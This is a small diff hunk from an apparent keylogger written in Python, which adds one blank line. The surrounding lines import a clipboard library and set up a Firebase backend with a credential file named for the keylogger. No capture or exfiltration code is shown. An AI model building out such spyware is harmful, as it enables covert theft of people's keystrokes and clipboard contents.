@@ -12,6 +12,7 @@ import requests
 import win32clipboard
 
 
+
 cred = credentials.Certificate("keylogger-firebase-adminsdk.json")
 firebase_admin.initialize_app(cred)
 
